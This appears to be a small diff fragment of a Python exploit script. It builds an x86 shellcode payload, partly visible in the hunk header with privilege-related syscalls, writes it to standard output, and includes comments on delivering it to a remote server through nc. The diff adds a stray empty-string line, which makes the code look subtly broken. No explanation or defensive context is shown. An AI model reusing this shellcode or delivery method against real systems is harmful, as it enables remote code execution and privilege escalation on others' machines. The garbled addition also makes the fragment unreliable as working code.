@@ -5,3 +5,4 @@ payload += b'\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x3
 sys.stdout.buffer.write(payload) # write bytes in standard output
 print() # recommended to use for the nc-based exploitation
 # to flush the remote server's stdin buffer
+""
